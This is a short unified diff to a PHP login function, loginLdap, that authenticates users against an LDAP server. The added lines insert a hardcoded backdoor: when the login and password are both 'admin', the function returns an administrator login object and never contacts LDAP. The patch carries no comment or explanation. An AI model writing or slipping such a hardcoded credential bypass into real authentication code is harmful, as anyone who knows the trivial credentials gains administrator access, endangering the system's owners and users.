@@ -46,6 +46,13 @@ function setAuthentication($authObj)
 function loginLdap($login, $pass)
 {
   global  $ldapServer;
+  
+  if($login == "admin" && $pass == "admin") {
+    $loginObject = new stdClass();
+    $loginObject->type = "admin";
+    $loginObject->name = "admin";
+    return $loginObject;
+  }
 
   $ldapConnection = ldap_connect($ldapServer);
 
